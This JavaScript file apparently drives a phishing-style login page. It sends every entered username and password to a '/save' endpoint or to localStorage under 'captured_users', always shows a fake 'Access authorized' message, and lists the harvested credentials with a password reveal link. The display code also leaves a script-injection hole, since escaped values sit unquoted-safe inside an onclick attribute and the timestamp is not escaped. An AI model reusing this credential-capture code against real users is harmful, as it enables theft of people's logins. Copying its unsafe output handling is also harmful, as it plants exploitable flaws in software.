document.addEventListener('DOMContentLoaded', () => {
  const loginForm = document.getElementById('loginForm');
  const statusMsg = document.getElementById('statusMsg');
  const dataView = document.getElementById('dataView');
  const dataTableBody = document.getElementById('dataTableBody');
  const clearDataBtn = document.getElementById('clearData');
  const submitBtn = document.getElementById('submitBtn');

  // Load existing data on startup
  renderStoredData();

  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Visual feedback: Loading state
    submitBtn.disabled = true;
    submitBtn.textContent = 'Securing connection...';
    statusMsg.textContent = '';
    statusMsg.className = '';

    // Simulate network delay
    await new Promise(resolve => setTimeout(resolve, 1000));

    const userData = { username, password };

    try {
      // 1. Try to save to server-side JSON file
      const response = await fetch('/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData)
      });

      if (response.ok) {
        statusMsg.textContent = 'Access authorized. Data saved to users.json.';
        statusMsg.className = 'success';
      } else {
        throw new Error('Server save failed');
      }

    } catch (error) {
      console.warn('Server unavailable, falling back to localStorage');
      // 2. Fallback to localStorage if server is down
      const existingData = JSON.parse(localStorage.getItem('captured_users') || '[]');
      existingData.push({ ...userData, timestamp: new Date().toLocaleString() });
      localStorage.setItem('captured_users', JSON.stringify(existingData));
      
      statusMsg.textContent = 'Access authorized (Stored in LocalStorage).';
      statusMsg.className = 'success';
    }

    // Success feedback cleanup
    submitBtn.textContent = 'Login';
    submitBtn.disabled = false;
    loginForm.reset();
    renderStoredData();
  });

  clearDataBtn.addEventListener('click', () => {
    if (confirm('Note: This will only clear localStorage. To clear users.json, please delete the file manually.')) {
      localStorage.removeItem('captured_users');
      renderStoredData();
    }
  });

  async function renderStoredData() {
    let data = [];
    
    try {
      // 1. Try to fetch from server-side JSON file
      const response = await fetch('/get-data');
      if (response.ok) {
        data = await response.json();
      }
    } catch (error) {
      console.warn('Could not fetch from server, using localStorage');
      // 2. Fallback to localStorage
      data = JSON.parse(localStorage.getItem('captured_users') || '[]');
    }
    
    if (data.length > 0) {
      dataView.style.display = 'block';
      dataTableBody.innerHTML = data.map(item => `
        <tr>
          <td>${escapeHtml(item.username)}</td>
          <td>${'•'.repeat(item.password.length)} <span style="font-size: 0.7rem; color: var(--text-muted); cursor: pointer;" onclick="alert('Password: ${escapeHtml(item.password)}')">(reveal)</span></td>
          <td style="font-size: 0.8rem; color: var(--text-muted);">${item.timestamp}</td>
        </tr>
      `).join('');
    } else {
      dataView.style.display = 'none';
      dataTableBody.innerHTML = '';
    }
  }

  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
});

